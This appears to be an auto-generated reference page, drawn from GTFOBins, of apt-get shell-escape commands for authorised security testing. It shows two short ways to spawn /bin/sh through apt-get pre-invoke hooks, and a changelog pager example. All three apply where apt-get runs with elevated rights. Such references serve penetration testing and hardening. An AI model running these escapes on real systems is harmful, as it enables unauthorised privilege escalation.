---
parsed_by: focuslocust
source: commands
type: generated
---
# apt-get Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## apt-get

Tool page: [apt-get](../../tools/linux/apt-get.md)

### inherit

```text
apt-get changelog apt
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/apt-get` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/apt-get` |
| Evidence | Function example preserved from source parser. |

### shell

```text
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/apt-get` |
| Evidence | Function example preserved from source parser. |
